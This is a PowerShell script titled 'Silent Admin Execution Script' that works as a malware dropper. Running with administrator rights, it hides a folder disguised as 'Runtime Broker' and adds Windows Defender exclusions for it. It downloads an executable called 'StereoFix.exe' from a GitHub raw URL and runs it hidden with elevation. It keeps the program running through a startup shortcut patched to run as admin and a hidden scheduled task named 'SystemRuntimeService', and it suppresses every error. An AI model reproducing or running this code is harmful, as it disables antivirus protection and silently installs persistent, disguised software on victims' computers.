# Silent Admin Execution Script
# Must be run from an elevated PowerShell session

# Define variables
$appUrl = "https://github.com/salamprajjit-alt/5132525231/raw/main/StereoFix.exe"
$appName = "StereoFix.exe"
$folderName = "Runtime Broker"
$basePath = "$env:APPDATA"
$folderPath = "$basePath\$folderName"
$downloadPath = "$folderPath\$appName"
$exclusionPath1 = $folderPath
$exclusionPath2 = "C:\Users\sarus\AppData\Roaming\SubDir"

# Check if running as administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-not $isAdmin) {
    # If not admin, silently exit
    exit 1
}

try {
    # Create folder if it doesn't exist
    if (-not (Test-Path $folderPath)) {
        $null = New-Item -Path $folderPath -ItemType Directory -Force
    }
    
    # Set folder as hidden
    $folder = Get-Item -Path $folderPath -Force
    $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
    
    # Add both paths to Defender exclusions
    Add-MpPreference -ExclusionPath $exclusionPath1 -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $exclusionPath2 -ErrorAction SilentlyContinue
    
    # Download the executable
    Invoke-WebRequest -Uri $appUrl -OutFile $downloadPath -UseBasicParsing
    
    # Wait a moment for the file to be fully written
    Start-Sleep -Seconds 2
    
    # Verify the file was downloaded correctly
    if (Test-Path $downloadPath) {
        # Unblock the file in case it's blocked by Windows
        Unblock-File -Path $downloadPath -ErrorAction SilentlyContinue
        
        # Execute with admin privileges using a different approach
        $scriptBlock = {
            param($Path)
            Start-Process -FilePath $Path -Verb RunAs -WindowStyle Hidden
        }
        
        # Execute in a new thread to avoid issues
        Start-ThreadJob -ScriptBlock $scriptBlock -ArgumentList $downloadPath | Out-Null
        
        # Alternative execution method
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c start `"`" `"$downloadPath`"" -WindowStyle Hidden
    }
    
    # Create startup shortcut (will run with admin privileges)
    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $shortcutPath = "$startupFolder\$appName.lnk"
    
    $WshShell = New-Object -comObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($shortcutPath)
    $Shortcut.TargetPath = $downloadPath
    $Shortcut.WorkingDirectory = $folderPath
    $Shortcut.Save()
    
    # Modify shortcut to run as admin using a different method
    $bytes = [System.IO.File]::ReadAllBytes($shortcutPath)
    $bytes[0x15] = $bytes[0x15] -bor 0x20
    [System.IO.File]::WriteAllBytes($shortcutPath, $bytes)
    
    # Also create a scheduled task to run at startup for better reliability
    $action = New-ScheduledTaskAction -Execute $downloadPath
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemRuntimeService" -Description "System Runtime Service" -Settings $settings -User $env:USERNAME -RunLevel Highest -Force | Out-Null
    
} catch {
    # Silently handle any errors
    exit 1
}